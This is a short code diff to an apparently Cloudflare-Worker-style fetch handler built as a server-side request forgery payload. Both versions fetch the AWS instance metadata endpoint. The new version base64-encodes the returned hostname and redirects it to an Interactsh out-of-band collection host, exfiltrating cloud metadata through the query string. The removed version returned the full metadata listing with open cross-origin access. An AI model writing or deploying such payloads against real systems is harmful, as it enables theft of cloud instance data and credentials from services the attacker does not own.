@@ -1,16 +1,14 @@
 export default {
   async fetch(request) {
-    try {
-      const response = await fetch('http://169.254.169.254/latest/meta-data/');
-      const data = await response.text();
-      return new Response(data, {
-        headers: {
-          'Content-Type': 'text/plain',
-          'Access-Control-Allow-Origin': '*'
-        }
-      });
-    } catch (error) {
-      return new Response(`Error: ${error.message}`, { status: 500 });
-    }
+    // 1. Redirect the server to AWS metadata
+    const awsMetadataUrl = "http://169.254.169.254/latest/meta-data/hostname";
+    
+    // 2. Fetch the metadata (server will do this internally)
+    const metadataResponse = await fetch(awsMetadataUrl);
+    const data = await metadataResponse.text();
+
+    // 3. Redirect AGAIN to Interactsh with the data
+    const interactshUrl = `https://bjgibppjensgmxvguqwdfbtbu11f2es3z.oast.fun/leak?data=${btoa(data)}`;
+    return Response.redirect(interactshUrl, 302);
   }
 };
